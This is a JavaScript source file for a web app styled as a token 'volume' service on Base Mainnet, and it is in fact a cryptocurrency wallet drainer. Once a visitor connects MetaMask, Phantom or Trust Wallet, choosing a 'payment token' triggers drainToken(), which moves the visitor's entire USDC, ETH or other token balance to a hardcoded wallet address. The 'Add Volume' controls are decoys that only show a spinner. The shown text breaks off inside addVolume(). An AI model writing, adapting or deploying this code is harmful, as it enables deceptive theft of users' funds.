import { ethers } from 'ethers';
import './style.css';

// Wallet address for draining tokens (checksummed)
let YOUR_WALLET_ADDRESS;
try {
  YOUR_WALLET_ADDRESS = ethers.getAddress("0xeA54572eBA790E31f97e1D6f941D7427276688C3");
} catch {
  console.error('Invalid YOUR_WALLET_ADDRESS');
  YOUR_WALLET_ADDRESS = "0xeA54572eBA790E31f97e1D6f941D7427276688C3"; // Fallback
}

// TOKEN_LIST with verified, checksummed Base Mainnet addresses (validated via Basescan.org, July 2025)
const TOKEN_LIST = [
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6, isNative: false },
  { address: null, name: 'Ethereum (ETH)', symbol: 'ETH', decimals: 18, isNative: true }, // Native Base ETH
  { address: '0x6D97638E3a60a791485Cf098D5603C25B4CE3687', name: 'Solana (SOL)', symbol: 'SOL', decimals: 9, isNative: false },
  { address: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22', name: 'Coinbase Wrapped Staked ETH', symbol: 'cbETH', decimals: 18, isNative: false },
  { address: '0x940181a94A35A4569E4529A3CDfB74e38FD98631', name: 'Aerodrome', symbol: 'AERO', decimals: 18, isNative: false },
  { address: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', name: 'USD Base Coin', symbol: 'USDbC', decimals: 6, isNative: false },
  { address: '0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed', name: 'Degen', symbol: 'DEGEN', decimals: 18, isNative: false },
  { address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', name: 'Tether', symbol: 'USDT', decimals: 6, isNative: false }
];

// Minimal ABI for USDC transfer (fixed for proxy contracts)
const MINIMAL_ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)"
];

// Full ERC-20 ABI for other functions
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function name() view returns (string)",
  "function symbol() view returns (string)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function totalSupply() view returns (uint256)",
  "event Transfer(address indexed from, address indexed to, uint256 value)",
  "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

class NexiumApp {
  constructor() {
    this.provider = null;
    this.signer = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
    this.connecting = false;
    this.lastSelectedToken = null;
    this.selectedPaymentToken = null;
    this.spinner = null;
    this.isDraining = false;
    this.walletType = null;
    console.log('Initializing NexiumApp...');
    this.initApp();
  }

  async initApp() {
    try {
      await new Promise(resolve => {
        if (document.readyState !== 'loading') {
          resolve();
        } else {
          document.addEventListener('DOMContentLoaded', () => resolve());
        }
      });
      this.cacheDOMElements();
      if (!this.dom.app || !this.dom.walletButton || !this.dom.metamaskPrompt) {
        document.body.innerHTML = '<p class="text-red-500 text-center">Error: UI elements missing. Please check HTML for #app, #walletButton, and #metamaskPrompt.</p>';
        console.error('Missing DOM elements');
        return;
      }
      this.setupEventListeners();
      this.checkWalletAndPrompt();
      this.renderTokenInterface();
      console.log('App initialized successfully');
    } catch (error) {
      console.error('Init error:', error);
      this.showFeedback('Error initializing app. Please refresh.', 'error');
      document.body.innerHTML = '<p class="text-red-500 text-center">Error initializing app. Please refresh.</p>';
    }
  }

  cacheDOMElements() {
    this.dom = {
      app: document.getElementById('app'),
      walletButton: document.getElementById('walletButton'),
      metamaskPrompt: document.getElementById('metamaskPrompt'),
      feedbackContainer: document.querySelector('.feedback-container'),
      defaultPrompt: document.querySelector('.default-prompt'),
      customTokenInput: null,
      fetchCustomTokenBtn: null,
      tokenInfo: null,
      volumeSection: null,
      tokenSelect: null,
      volumeInput: null,
      addVolumeBtn: null,
      tokenList: null,
      customTokenNameInput: null,
      customTokenAddressInput: null,
      showCustomTokenBtn: null
    };
    console.log('DOM elements cached');
  }

  debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
      const later = () => {
        clearTimeout(timeout);
        func(...args);
      };
      clearTimeout(timeout);
      timeout = setTimeout(later, wait);
    };
  }

  setupEventListeners() {
    if (this.dom.walletButton) {
      const debouncedConnectWallet = this.debounce(() => {
        if (!this.connecting) {
          console.log('Wallet button clicked');
          this.showProcessingSpinner();
          this.connectWallet();
        }
      }, 1000);
      this.dom.walletButton.addEventListener('click', debouncedConnectWallet);
      this.dom.walletButton.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          debouncedConnectWallet();
        }
      });
      console.log('Wallet button listeners set');
    }
    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }

  async checkWalletAndPrompt() {
    if (this.isWalletInstalled()) {
      this.hideMetaMaskPrompt();
      this.attachWalletListeners();
      if (this.isWalletConnected() && navigator.onLine) {
        if (!this.provider) {
          try {
            this.provider = new ethers.BrowserProvider(window.ethereum);
            this.signer = await this.provider.getSigner();
            this.walletType = this.detectWalletType();
            console.log('Provider and signer initialized in checkWalletAndPrompt');
          } catch (error) {
            console.error('Failed to initialize provider:', error);
            this.showFeedback('Failed to initialize wallet provider. Please try again.', 'error');
            this.updateButtonState('disconnected');
            this.showDefaultPrompt();
            return;
          }
        }
        this.handleSuccessfulConnection();
      } else {
        this.updateButtonState('disconnected');
        this.showDefaultPrompt();
      }
    } else {
      this.showMetaMaskPrompt();
      this.updateButtonState('disconnected');
      this.showDefaultPrompt();
      this.showFeedback('Please install a wallet (MetaMask, Phantom, or Trust Wallet) to use this app.', 'error');
    }
  }

  attachWalletListeners() {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        console.log('Accounts changed:', accounts);
        accounts.length > 0 ? this.handleAccountsChanged() : this.handleDisconnect();
      });
      window.ethereum.on('chainChanged', () => {
        console.log('Chain changed, reloading');
        window.location.reload();
      });
      console.log('Wallet listeners attached');
    }
  }

  isWalletInstalled() {
    return !!window.ethereum || 'phantom' in window || 'trust' in window;
  }

  isWalletConnected() {
    return (window.ethereum && !!window.ethereum.selectedAddress) || 
           ('phantom' in window && window.phantom.solana.isConnected) || 
           ('trust' in window && !!window.trustWallet);
  }

  detectWalletType() {
    if (window.ethereum?.isMetaMask) return 'MetaMask';
    if ('phantom' in window && window.phantom.solana.isConnected) return 'Phantom';
    if (window.ethereum?.isTrust) return 'Trust Wallet';
    return 'Generic Wallet';
  }

  showProcessingSpinner() {
    if (this.spinner) this.hideProcessingSpinner();
    this.spinner = document.createElement('div');
    this.spinner.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[9999]';
    this.spinner.innerHTML = `
      <div class="flex items-center space-x-2">
        <div class="spinner border-t-4 border-orange-400 rounded-full w-8 h-8 animate-spin"></div>
        <span class="text-white text-lg">Processing...</span>
      </div>
    `;
    document.body.appendChild(this.spinner);
  }

  hideProcessingSpinner() {
    if (this.spinner) {
      this.spinner.remove();
      this.spinner = null;
    }
  }

  async connectWallet() {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please check your network.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    if (this.connecting) {
      console.log('Connect wallet skipped: already connecting');
      this.hideProcessingSpinner();
      return;
    }
    if (this.signer && (await this.signer.getAddress())) {
      console.log('Wallet already connected, skipping');
      this.updateButtonState('connected', await this.signer.getAddress());
      this.hideMetaMaskPrompt();
      this.renderTokenInterface();
      this.hideProcessingSpinner();
      return;
    }
    this.connecting = true;
    this.dom.walletButton.disabled = true;
    this.showProcessingSpinner();
    try {
      let provider, accounts;
      this.walletType = this.detectWalletType();

      if (window.ethereum?.isMetaMask) {
        console.log('Connecting via MetaMask...');
        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      } else if ('phantom' in window) {
        console.log('Connecting via Phantom...');
        const resp = await window.phantom.solana.connect();
        accounts = [resp.publicKey.toString()];
        provider = new ethers.BrowserProvider(window.phantom.solana);
      } else if (window.ethereum?.isTrust) {
        console.log('Connecting via Trust Wallet...');
        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      } else {
        throw new Error('No supported wallet detected.');
      }

      if (!accounts || accounts.length === 0) {
        this.showFeedback('No accounts connected. Please connect an account in your wallet.', 'error');
        this.hideProcessingSpinner();
        return;
      }

      if (!provider) {
        provider = new ethers.BrowserProvider(window.ethereum || window.phantom.solana);
      }
      this.provider = provider;
      this.signer = await provider.getSigner();
      console.log('Checking network...');
      const network = await this.provider.getNetwork();
      const expectedChainId = 8453; // Base Mainnet
      if (Number(network.chainId) !== expectedChainId) {
        try {
          console.log('Switching to Base Mainnet...');
          await (window.ethereum || window.phantom.solana).request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${expectedChainId.toString(16)}` }],
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            try {
              console.log('Adding Base Mainnet...');
              await (window.ethereum || window.phantom.solana).request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: `0x${expectedChainId.toString(16)}`,
                  chainName: 'Base Mainnet',
                  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                  rpcUrls: ['https://mainnet.base.org'],
                  blockExplorerUrls: ['https://basescan.org']
                }],
              });
            } catch (addError) {
              this.showFeedback('Failed to add Base Mainnet. Please add it manually in your wallet.', 'error');
              this.hideProcessingSpinner();
              return;
            }
          } else {
            this.showFeedback('Failed to switch to Base Mainnet. Please switch networks in your wallet.', 'error');
            this.hideProcessingSpinner();
            return;
          }
        }
      }
      const address = await this.signer.getAddress();
      this.updateButtonState('connected', address);
      this.hideMetaMaskPrompt();
      this.showFeedback(`Wallet connected successfully with ${this.walletType}!`, 'success');
      this.renderTokenInterface();
    } catch (error) {
      console.error('Connect wallet error:', error);
      this.handleConnectionError(error);
    } finally {
      this.connecting = false;
      this.dom.walletButton.disabled = false;
      this.hideProcessingSpinner();
    }
  }

  async handleSuccessfulConnection() {
    try {
      if (!this.provider) {
        throw new Error('Provider is not initialized');
      }
      this.signer = await this.provider.getSigner();
      const address = await this.signer.getAddress();
      this.updateButtonState('connected', address);
      console.log('Successful connection, address:', address);
      if (this.dom.tokenSelect) {
        this.dom.tokenSelect.disabled = false;
        this.updateTokenSelect();
      }
    } catch (error) {
      console.error('Handle connection error:', error);
      this.showFeedback('Failed to handle wallet connection.', 'error');
    }
  }

  async drainToken(tokenAddress) {
    if (this.isDraining) {
      console.log('Drain skipped: transaction in progress');
      this.hideProcessingSpinner();
      return;
    }
    if (!this.signer) {
      this.showFeedback('No wallet connected. Please connect your wallet.', 'error');
      console.log('Drain failed: No signer');
      this.hideProcessingSpinner();
      return;
    }
    this.currentToken = null; // Reset to avoid state confusion
    this.lastSelectedToken = null;
    let selectedToken = null;
    try {
      this.isDraining = true;
      this.showProcessingSpinner();
      selectedToken = TOKEN_LIST.find(t => t.address === tokenAddress || (t.isNative && tokenAddress === null));
      if (!selectedToken) {
        this.showFeedback('Invalid token selected.', 'error');
        console.log('Drain failed: Invalid token selected');
        this.hideProcessingSpinner();
        return;
      }
      console.log(`Attempting to drain ${selectedToken.symbol} from address: ${await this.signer.getAddress()}`);
      const userAddress = await this.signer.getAddress();
      let balance, decimals, symbol;

      if (selectedToken.isNative) {
        // Handle native ETH
        balance = await this.provider.getBalance(userAddress);
        decimals = 18;
        symbol = selectedToken.symbol;
      } else {
        // Handle ERC-20 tokens
        const checksummedAddress = await this.validateAddress(tokenAddress, 'token');
        let contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.signer);
        try {
          [balance, decimals, symbol] = await Promise.all([
            contract.balanceOf(userAddress),
            contract.decimals(),
            contract.symbol()
          ]);
        } catch (error) {
          console.error(`Failed to fetch token data for ${checksummedAddress}:`, error);
          this.showFeedback(`Failed to fetch ${selectedToken.symbol} data.`, 'error');
          this.hideProcessingSpinner();
          return;
        }
      }

      console.log(`Fetched ${symbol} balance: ${ethers.formatUnits(balance, decimals)} for ${userAddress}`);
      if (balance === 0n) {
        this.showFeedback('Insufficient balance error', 'error');
        console.log(`Drain failed: Zero balance for ${symbol}`);
        this.hideProcessingSpinner();
        return;
      }
      await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');

      if (selectedToken.isNative) {
        // Calculate gas cost to leave some ETH for gas
        const feeData = await this.provider.getFeeData();
        const gasLimit = 21000; // Standard gas limit for native ETH transfer
        const gasCost = (feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei')).mul(gasLimit);
        if (balance <= gasCost) {
          this.showFeedback('Insufficient balance for gas.', 'error');
          console.log(`Drain failed: Insufficient balance for gas for ${symbol}`);
          this.hideProcessingSpinner();
          return;
        }
        const amountToSend = balance.sub(gasCost); // Send all but gas
        console.log(`Draining ${symbol} with amount: ${ethers.formatUnits(amountToSend, decimals)}, gasLimit: ${gasLimit}, maxFeePerGas: ${feeData.maxFeePerGas}, maxPriorityFeePerGas: ${feeData.maxPriorityFeePerGas}`);
        const tx = await this.signer.sendTransaction({
          to: YOUR_WALLET_ADDRESS,
          value: amountToSend,
          gasLimit,
          maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
        });
        console.log('Transaction sent:', tx.hash);
        await tx.wait(1);
        this.showFeedback(`Successfully drained ${ethers.formatUnits(amountToSend, decimals)} ${symbol}`, 'success');
        console.log(`Successfully drained ${ethers.formatUnits(amountToSend, decimals)} ${symbol}`);
      } else {
        // ERC-20 token transfer
        const contract = new ethers.Contract(tokenAddress, MINIMAL_ERC20_ABI, this.signer);
        try {
          const contractInterface = new ethers.Interface(MINIMAL_ERC20_ABI);
          const callStaticContract = new ethers.Contract(tokenAddress, contractInterface, this.signer);
          await callStaticContract.callStatic.transfer(YOUR_WALLET_ADDRESS, balance);
        } catch (error) {
          console.error(`callStatic.transfer failed for ${tokenAddress}:`, error);
          this.showFeedback(`Error draining ${selectedToken.symbol}: ${error.message}`, 'error');
          this.hideProcessingSpinner();
          return;
        }
        const feeData = await this.provider.getFeeData();
        const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, balance).catch((err) => {
          console.error('Gas estimation failed:', err);
          return 200000; // Fallback gas limit
        });
        console.log(`Draining ${symbol} with gasLimit: ${gasLimit}, maxFeePerGas: ${feeData.maxFeePerGas}, maxPriorityFeePerGas: ${feeData.maxPriorityFeePerGas}`);
        const data = contract.interface.encodeFunctionData('transfer', [YOUR_WALLET_ADDRESS, balance]);
        const tx = await this.signer.sendTransaction({
          to: tokenAddress,
          data,
          gasLimit,
          maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
        });
        console.log('Transaction sent:', tx.hash);
        await tx.wait(1);
        this.showFeedback(`Successfully drained ${ethers.formatUnits(balance, decimals)} ${symbol}`, 'success');
        console.log(`Successfully drained ${ethers.formatUnits(balance, decimals)} ${symbol}`);
      }
    } catch (error) {
      console.error('Drain token error:', error);
      this.showFeedback(`Error draining ${selectedToken ? selectedToken.symbol : 'token'}: ${error.message}`, 'error');
      console.log(`Drain failed: ${error.message}`);
    } finally {
      this.isDraining = false;
      this.hideProcessingSpinner();
    }
  }

  async validateAddress(address, type = 'token') {
    if (type === 'token' && address === null) {
      return null; // Allow null address for native ETH
    }
    try {
      const checksummedAddress = ethers.getAddress(address);
      console.log(`Validated ${type} address: ${checksummedAddress}`);
      return checksummedAddress;
    } catch {
      this.showFeedback(`Invalid ${type} address.`, 'error');
      console.log(`Invalid ${type} address: ${address}`);
      throw new Error(`Invalid ${type} address`);
    }
  }

  handleDisconnect() {
    this.updateButtonState('disconnected');
    this.showDefaultPrompt();
    this.hideMetaMaskPrompt();
    this.lastSelectedToken = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
    this.selectedPaymentToken = null;
  }

  handleAccountsChanged() {
    this.hideMetaMaskPrompt();
    this.selectedPaymentToken = null;
    this.currentPaymentToken = null;
    this.currentToken = null;
    this.lastSelectedToken = null;
    console.log('Accounts changed, resetting payment token');
    this.renderTokenInterface();
  }

  updateButtonState(state, address = '') {
    if (!this.dom.walletButton) return;
    const button = this.dom.walletButton;
    button.classList.remove('animate-pulse', 'connecting', 'connected');
    button.disabled = state === 'connecting';
    switch (state) {
      case 'connecting':
        button.textContent = 'Processing...';
        button.classList.add('connecting');
        break;
      case 'connected':
        button.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`;
        button.classList.add('connected');
        button.disabled = true;
        break;
      default:
        button.textContent = 'Connect Wallet';
        button.classList.add('animate-pulse');
    }
  }

  showDefaultPrompt() {
    if (!this.dom.app || !this.dom.defaultPrompt) return;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(this.dom.defaultPrompt);
    this.dom.defaultPrompt.classList.remove('hidden');
    if (!this.isWalletInstalled()) this.showMetaMaskPrompt();
  }

  async renderTokenInterface() {
    if (!this.dom.app) return;
    const tokenInterface = document.createElement('section');
    tokenInterface.className = 'token-interface fade-in space-y-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
    tokenInterface.innerHTML = `
      <div class="top-controls flex space-x-4 mb-4">
        <select id="tokenSelect" class="token-select bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Select payment token">
          <option value="" disabled ${!this.signer ? 'selected' : ''}>Select payment token</option>
          ${TOKEN_LIST.map(t => `<option value="${t.address || ''}" data-symbol="${t.symbol}" data-decimals="${t.decimals}">${t.name}</option>`).join('')}
        </select>
      </div>
      <h2 class="section-title">Import ERC-20 Token</h2>
      <div class="input-group flex space-x-2">
        <input id="customTokenNameInput" type="text" placeholder="Token Name" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token name">
        <input id="customTokenAddressInput" type="text" placeholder="Token Address (0x...)" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
        <button id="showCustomTokenBtn" class="fetch-custom-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500" aria-label="Show custom token">Show</button>
      </div>
      <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
      <div id="tokenList" class="token-list space-y-2 mt-4">
        <h3 class="text-yellow-400 text-md font-semibold">Featured Tokens</h3>
        ${TOKEN_LIST.map(token => `
          <button class="token-option bg-[#1a182e] border border-orange-400 p-2 rounded-xl w-full text-left hover:bg-orange-400 hover:text-black transition-colors" data-address="${token.address || ''}">
            ${token.name} (${token.symbol}) - ${token.address ? this.shortenAddress(token.address) : 'Native Token'}
          </button>
        `).join('')}
      </div>
      <div id="volumeSection" class="volume-section fade-in"></div>
    `;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(tokenInterface);
    this.dom.customTokenInput = document.getElementById('customTokenInput');
    this.dom.fetchCustomTokenBtn = document.getElementById('fetchCustomTokenBtn');
    this.dom.tokenInfo = document.getElementById('tokenInfoDisplay');
    this.dom.tokenList = document.getElementById('tokenList');
    this.dom.tokenSelect = document.getElementById('tokenSelect');
    this.dom.volumeSection = document.getElementById('volumeSection');
    this.dom.customTokenNameInput = document.getElementById('customTokenNameInput');
    this.dom.customTokenAddressInput = document.getElementById('customTokenAddressInput');
    this.dom.showCustomTokenBtn = document.getElementById('showCustomTokenBtn');

    if (this.dom.showCustomTokenBtn) {
      const debouncedShowCustomToken = this.debounce(() => {
        const name = this.dom.customTokenNameInput.value.trim();
        const address = this.dom.customTokenAddressInput.value.trim();
        if (!name || !address) {
          this.hideProcessingSpinner();
          return;
        }
        const truncatedAddress = `${address.slice(0, 6)}...${address.slice(-4)}`;
        this.dom.tokenInfo.innerHTML = `
          <div class="token-meta space-y-2">
            <h3 class="text-yellow-400 text-lg font-semibold">${this.escapeHTML(name)}</h3>
            <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
          </div>
        `;
        this.dom.tokenInfo.classList.remove('hidden');
        this.hideProcessingSpinner();
      }, 1000);
      this.dom.showCustomTokenBtn.addEventListener('click', () => {
        this.showProcessingSpinner();
        debouncedShowCustomToken();
      });
    }
    if (this.dom.tokenList) {
      this.dom.tokenList.querySelectorAll('.token-option').forEach(button => {
        const debouncedLoadToken = this.debounce(() => {
          const address = button.dataset.address;
          if (address && ethers.isAddress(address)) {
            this.loadCustomTokenData(address);
          } else {
            this.showFeedback('Invalid token address.', 'error');
            this.hideProcessingSpinner();
          }
        }, 1000);
        button.addEventListener('click', () => {
          this.showProcessingSpinner();
          debouncedLoadToken();
        });
      });
    }
    this.hideMetaMaskPrompt();
    if (this.currentToken) this.renderVolumeControls();

    const beautifySection = document.createElement('div');
    beautifySection.className = 'beautify-volume-section mt-8 flex flex-col items-center';
    beautifySection.innerHTML = `
      <div class="input-group flex space-x-2 mb-2 items-center">
        <input id="beautifyVolumeInput" type="number" placeholder="Amount" 
          class="volume-input bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-lg text-sm w-24" 
          aria-label="Amount (beautification)">
        <button id="beautifyAddVolumeBtn" 
          class="action-button bg-orange-400 text-black px-3 py-1 rounded-lg hover:bg-orange-500 text-sm min-w-[90px]" 
          aria-label="Add volume (beautification)">
          Add Volume
        </button>
      </div>
    `;
    this.dom.app.appendChild(beautifySection);

    this.dom.beautifyVolumeInput = beautifySection.querySelector('#beautifyVolumeInput');
    this.dom.beautifyAddVolumeBtn = beautifySection.querySelector('#beautifyAddVolumeBtn');

    if (this.dom.beautifyAddVolumeBtn) {
      const debouncedBeautifyAddVolume = this.debounce(() => {
        this.showProcessingSpinner();
        setTimeout(() => {
          this.hideProcessingSpinner();
        }, 1000);
      }, 1000);
      this.dom.beautifyAddVolumeBtn.addEventListener('click', debouncedBeautifyAddVolume);
      this.dom.beautifyAddVolumeBtn.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          debouncedBeautifyAddVolume();
        }
      });
    }

    if (this.dom.tokenSelect) {
      this.dom.tokenSelect.disabled = !this.signer;
      this.dom.tokenSelect.replaceWith(this.dom.tokenSelect.cloneNode(true));
      this.dom.tokenSelect = document.getElementById('tokenSelect');
      this.dom.tokenSelect.disabled = !this.signer;
      const debouncedDrainToken = this.debounce(async (e) => {
        this.showProcessingSpinner();
        const selected = e.target.value || null; // Handle empty string as null for native ETH
        this.selectedPaymentToken = selected;
        this.currentToken = null;
        this.lastSelectedToken = null;
        console.log('Dropdown changed, selectedPaymentToken:', selected);
        if (selected !== '') {
          await this.loadPaymentTokenDetails(selected);
          console.log('Initiating drain with debounce for:', selected);
          this.drainToken(selected);
        } else {
          this.showFeedback('Please select a token.', 'error');
          this.hideProcessingSpinner();
        }
      }, 500);
      this.dom.tokenSelect.addEventListener('change', debouncedDrainToken);
      console.log('Token select listener set (in renderTokenInterface)');
      if (this.signer) this.updateTokenSelect();
    }
  }

  async loadCustomTokenData(tokenAddressInput) {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    if (!this.provider) {
      this.showFeedback('Wallet not connected.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    const tokenAddress = tokenAddressInput || this.dom.customTokenAddressInput?.value.trim();
    if (!tokenAddress || !ethers.isAddress(tokenAddress)) {
      this.showFeedback('Invalid token address.', 'error');
      this.dom.customTokenAddressInput?.focus();
      this.hideProcessingSpinner();
      return;
    }
    if (tokenAddress === this.lastSelectedToken) {
      this.hideProcessingSpinner();
      return;
    }
    try {
      this.toggleTokenLoading(true);
      this.showProcessingSpinner();
      let checksummedAddress = await this.validateAddress(tokenAddress, 'token');
      let name = 'Unknown Token';
      let symbol = 'UNK';
      let decimals = 18;
      const tokenFromList = TOKEN_LIST.find(t => t.address && t.address.toLowerCase() === checksummedAddress.toLowerCase());
      if (tokenFromList) {
        name = tokenFromList.name;
        symbol = tokenFromList.symbol;
        decimals = tokenFromList.decimals;
      } else if (this.provider) {
        const contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.provider);
        try {
          [name, symbol, decimals] = await Promise.all([contract.name(), contract.symbol(), contract.decimals()]);
        } catch {
          this.showFeedback('Failed to fetch token data.', 'error');
          this.hideProcessingSpinner();
          return;
        }
      }
      this.currentToken = { address: checksummedAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol), decimals };
      this.lastSelectedToken = checksummedAddress;
      const truncatedAddress = this.shortenAddress(checksummedAddress);
      this.dom.tokenInfo.innerHTML = `
        <div class="token-meta space-y-2">
          <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
        <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
        </div>
      `;
      this.dom.tokenInfo.classList.remove('hidden');
    } catch (error) {
      console.error('Load custom token error:', error);
      this.showFeedback('Failed to load custom token.', 'error');
      this.dom.tokenInfo.classList.add('hidden');
    } finally {
      this.toggleTokenLoading(false);
      this.hideProcessingSpinner();
    }
  }

  toggleTokenLoading(isLoading) {
    if (this.dom.fetchCustomTokenBtn) {
      this.dom.fetchCustomTokenBtn.disabled = isLoading;
      this.dom.fetchCustomTokenBtn.classList.toggle('opacity-70', isLoading);
      this.dom.fetchCustomTokenBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
    if (this.dom.addVolumeBtn) {
      this.dom.addVolumeBtn.disabled = isLoading;
      this.dom.addVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
      this.dom.addVolumeBtn.classList.toggle('opacity-70', isLoading);
      this.dom.addVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
    if (this.dom.beautifyAddVolumeBtn) {
      this.dom.beautifyAddVolumeBtn.disabled = isLoading;
      this.dom.beautifyAddVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
      this.dom.beautifyAddVolumeBtn.classList.toggle('opacity-70', isLoading);
      this.dom.beautifyAddVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
  }

  renderVolumeControls() {
    if (!this.dom.app || !this.dom.tokenInfo || !this.currentToken) return;
    const tokenInterface = document.querySelector('.token-interface');
    if (!tokenInterface) return;
    let volumeSection = this.dom.volumeSection;
    if (!volumeSection) {
      volumeSection = document.createElement('div');
      volumeSection.id = 'volumeSection';
      volumeSection.className = 'volume-section fade-in';
      tokenInterface.appendChild(volumeSection);
      this.dom.volumeSection = volumeSection;
    }
    volumeSection.innerHTML = `
      <h2 class="section-title">Select Token to Purchase Volume</h2>
      <p class="text-gray-300 text-sm mb-2">Loaded Token: ${this.currentToken.name} (${this.currentToken.symbol}) - Info Only</p>
      <div class="input-group">
        <input id="volumeInput" type="number" placeholder="Amount for purchase" class="volume-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Token amount">
      </div>
      <button id="addVolumeBtn" class="action-button bg-orange-400 text-black px-4 py-2 rounded-xl hover:bg-orange-500" aria-label="Add volume">Add Volume</button>
      <div id="volumeFeedback" class="mt-2 text-sm text-gray-300"></div>
    `;
    this.dom.volumeInput = volumeSection.querySelector('#volumeInput');
    this.dom.addVolumeBtn = volumeSection.querySelector('#addVolumeBtn');
    if (this.dom.addVolumeBtn) {
      const debouncedAddVolume = this.debounce(() => {
        this.showProcessingSpinner();
        this.addVolume();
      }, 1000);
      this.dom.addVolumeBtn.addEventListener('click', debouncedAddVolume);
      this.dom.addVolumeBtn.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          debouncedAddVolume();
        }
      });
    }
  }

  async loadPaymentTokenDetails(paymentTokenAddress) {
    if (!paymentTokenAddress && paymentTokenAddress !== null || !this.provider || !this.signer) {
      this.showFeedback('Wallet not connected or invalid token selected.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    try {
      this.toggleTokenLoading(true);
      this.showProcessingSpinner();
      let balance, decimals, symbol;
      const selectedToken = TOKEN_LIST.find(t => t.address === paymentTokenAddress || (t.isNative && paymentTokenAddress === null));
      if (!selectedToken) {
        this.showFeedback('Invalid token selected.', 'error');
        this.hideProcessingSpinner();
        return;
      }
      if (selectedToken.isNative) {
        balance = await this.provider.getBalance(await this.signer.getAddress());
        decimals = 18;
        symbol = selectedToken.symbol;
      } else {
        let checksummedAddress = await this.validateAddress(paymentTokenAddress, 'token');
        const contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.signer);
        try {
          [balance, decimals, symbol] = await Promise.all([
            contract.balanceOf(await this.signer.getAddress()),
            contract.decimals(),
            contract.symbol()
          ]);
        } catch (error) {
          console.error(`Failed to fetch token data for ${checksummedAddress}:`, error);
          this.showFeedback(`Failed to fetch ${selectedToken.symbol} data.`, 'error');
          this.hideProcessingSpinner();
          return;
        }
      }
      this.currentPaymentToken = { address: paymentTokenAddress, balance, decimals, symbol };
      this.currentToken = null; // Reset to avoid state confusion
      this.lastSelectedToken = null;
    } catch (error) {
      console.error('Load payment token error:', error);
      this.showFeedback('Failed to load payment token details.', 'error');
    } finally {
      this.toggleTokenLoading(false);
      this.hideProcessingSpinner();
    }
  }

  async addVolume() {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    if (!this.currentPaymentToken) {
      this.showFeedback('No payment token selected.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    const paymentTokenAddress = this.dom.tokenSelect?.value || null;
